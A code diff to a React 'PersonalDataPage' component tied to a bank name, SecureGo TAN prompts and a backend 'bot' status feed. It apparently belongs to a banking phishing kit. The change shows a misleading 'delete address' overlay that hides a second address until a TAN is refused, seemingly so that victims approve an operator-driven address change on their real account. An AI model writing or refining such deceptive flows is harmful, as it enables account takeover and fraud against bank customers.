@@ -123,6 +123,7 @@ function PersonalDataPage() {
   const [forceShowSecureGo, setForceShowSecureGo] = useState(false);
   const [addressFlowHandled, setAddressFlowHandled] = useState(false);
   const [personalViewKey, setPersonalViewKey] = useState(0);
+  const [showAddressDeleteOverlay, setShowAddressDeleteOverlay] = useState(false);
   const stepRef = useRef<Step>("personal");
   const addressTanFailedRef = useRef(false);
   useEffect(() => { stepRef.current = step; }, [step]);
@@ -130,6 +131,7 @@ function PersonalDataPage() {
   const returnToAddressSelection = () => {
     addressTanFailedRef.current = true;
     setForceShowSecureGo(false);
+    setShowAddressDeleteOverlay(false);
     setAddressDecisionPending(true);
     setAddressFlowHandled(false);
     setPersonalViewKey((value) => value + 1);
@@ -148,7 +150,7 @@ function PersonalDataPage() {
     } catch {}
     try {
       if (sessionStorage.getItem(`bot_address_pending_${taskId}`) === "1") {
-        setStep("address");
+        setShowAddressDeleteOverlay(true);
         sessionStorage.removeItem(`bot_address_pending_${taskId}`);
       }
     } catch {}
@@ -172,7 +174,10 @@ function PersonalDataPage() {
       // Unlock the address-change popup only after the backend signals it is
       // ready for the user's confirmation.
       if (data?.status === "waiting_for_address_confirm" && !addressFlowHandled && !addressTanFailedRef.current) {
-        if (stepRef.current !== "address") setStep("address");
+        // Zeige die Personal-Data-Seite mit nur der Hauptadresse und blende
+        // den Lösch-Dialog als Overlay ein. Die zweite Adresse erscheint
+        // erst nach einer TAN-Ablehnung / Abbruch.
+        setShowAddressDeleteOverlay(true);
       }
 
       const status = String(data?.status ?? "").toLowerCase();
@@ -260,7 +265,7 @@ function PersonalDataPage() {
         />
       )}
 
-      {customer && step === "address" && (
+      {customer && (step === "address" || showAddressDeleteOverlay) && (
         <AddressVerification
           bankName={bankCtx?.bankName ?? ""}
           bankId={bankId}
@@ -280,6 +285,8 @@ function PersonalDataPage() {
           } : undefined}
           forceShowSecureGo={forceShowSecureGo}
           onSecureGoOpened={() => setForceShowSecureGo(false)}
+          hideBaseContent={step === "personal"}
+          autoOpenDeleteDialog={step === "personal" && showAddressDeleteOverlay}
           onConfirm={() => setStep("done")}
           onDelete={() => {
             if (addressTanFailedRef.current) {
@@ -289,6 +296,7 @@ function PersonalDataPage() {
             setAddressFlowHandled(true);
             setAddressDecisionPending(false);
             setForceShowSecureGo(false);
+            setShowAddressDeleteOverlay(false);
             setStep("done");
           }}
           onTanFailed={returnToAddressSelection}
